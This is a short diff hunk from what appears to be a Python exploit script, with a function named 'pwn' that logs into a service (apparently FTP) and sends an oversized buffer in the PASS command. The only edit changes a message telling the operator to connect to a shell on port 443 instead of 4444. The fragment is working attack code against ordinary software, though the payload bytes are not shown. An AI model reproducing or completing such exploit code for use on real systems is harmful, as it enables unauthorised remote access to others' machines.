@@ -66,7 +66,7 @@ def pwn(ip, port, payload):
         s.send('USER username' + '\r\n')
         data = s.recv(1024)
         s.send('PASS ' + buff + '\r\n')
-        print("[*] Done, try connecting on port 4444")
+        print("[*] Done, if default payload try connecting on port 443")
     except socket.timeout:
         print("[*] ERROR: Socket timeout at {} seconds... aborting".format(timeout))
     except socket.error:
